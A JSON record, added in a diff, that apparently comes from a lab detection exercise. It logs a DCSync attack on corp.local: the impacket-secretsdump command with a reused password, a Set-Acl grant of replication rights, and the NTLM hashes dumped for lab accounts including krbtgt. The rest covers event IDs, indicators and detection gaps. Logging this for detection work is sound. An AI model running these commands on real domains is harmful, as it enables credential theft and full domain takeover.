@@ -1,0 +1,94 @@
+{
+  "id": "ATK-006",
+  "title": "DCSync via jsmith ACL Rights",
+  "sprint": 1,
+  "date": "2026-04-26",
+  "status": "complete",
+  "mitre": {
+    "tactic": "Credential Access",
+    "technique": "T1003.006",
+    "name": "OS Credential Dumping: DCSync"
+  },
+  "attacker": {
+    "host": "kali",
+    "ip": "10.10.10.99",
+    "tool": "impacket-secretsdump",
+    "method": "DRSUAPI replication protocol"
+  },
+  "target": {
+    "host": "DC01",
+    "ip": "10.10.10.40",
+    "domain": "corp.local",
+    "account_abused": "jsmith",
+    "acl_rights": ["GetChanges (1131f6aa)", "GetChangesAll (1131f6ad)"]
+  },
+  "prerequisite": {
+    "credential": "jsmith:Password123!",
+    "source": "ATK-002 SMB relay + offline crack"
+  },
+  "stages": [
+    {
+      "stage": 1,
+      "name": "Credential reuse",
+      "technique": "T1078.002",
+      "command": null,
+      "result": "jsmith:Password123! available from ATK-002",
+      "detected": false,
+      "detection_note": "Offline crack — VIS-003"
+    },
+    {
+      "stage": 2,
+      "name": "DCSync attempt — denied",
+      "technique": "T1003.006",
+      "command": "impacket-secretsdump 'corp.local/jsmith:Password123!@10.10.10.40'",
+      "result": "DRSR SessionError: ERROR_DS_DRA_ACCESS_DENIED",
+      "detected": true,
+      "detection_note": "EC4662 fired 4 events at 03:47:26 — access denied still logged",
+      "splunk_events": 4,
+      "timestamp": "2026-04-26T03:47:26"
+    },
+    {
+      "stage": 3,
+      "name": "ACL grant on domain object",
+      "technique": "T1098",
+      "command": "Set-Acl 'AD:DC=corp,DC=local' — GetChanges + GetChangesAll for jsmith",
+      "result": "ACL successfully modified",
+      "detected": false,
+      "detection_note": "VIS-006 — advanced AD object access auditing not enabled"
+    },
+    {
+      "stage": 4,
+      "name": "DCSync execution — successful",
+      "technique": "T1003.006",
+      "command": "impacket-secretsdump 'corp.local/jsmith:Password123!@10.10.10.40'",
+      "result": "Full domain credential dump — 8 accounts + all Kerberos keys",
+      "detected": true,
+      "detection_note": "EC4662 fired 28 events across two bursts",
+      "splunk_events": 28,
+      "timestamp": "2026-04-26T03:50:38"
+    }
+  ],
+  "credentials_dumped": [
+    { "account": "Administrator", "rid": 500, "ntlm": "423fe085824dc357762259ddbb2541d2" },
+    { "account": "krbtgt", "rid": 502, "ntlm": "94645007672cec1a5ac3a6ac6c08184e" },
+    { "account": "jsmith", "rid": 1103, "ntlm": "2b576acbe6bcfda7294d6bd18041b8fe" },
+    { "account": "jdoe", "rid": 1104, "ntlm": "2b576acbe6bcfda7294d6bd18041b8fe" },
+    { "account": "svc-jenkins", "rid": 1105, "ntlm": "15a8eccc12c937774986f16cdef99758" },
+    { "account": "DC01$", "rid": 1000, "ntlm": "eea5269a5d107a47f7d8a4562c060cc7" },
+    { "account": "WIN11-PC$", "rid": 1107, "ntlm": "5fe6540106539ddd4039c595db25c4dc" }
+  ],
+  "detection_summary": {
+    "stages_detected": 2,
+    "stages_total": 4,
+    "detection_rate": "50%",
+    "key_event_ids": ["4624", "4662"],
+    "key_indicators": [
+      "EC4662 from non-machine account",
+      "GUIDs 1131f6aa + 1131f6ad in Properties field",
+      "EC4624 from 10.10.10.99 immediately preceding EC4662"
+    ]
+  },
+  "visibility_gaps": ["VIS-003", "VIS-006"],
+  "sigma_rule": "sigma_dcsync_T1003.006.yml",
+  "hashes_saved": "~/corplab/hashes/atk006-dcsync.txt"
+}
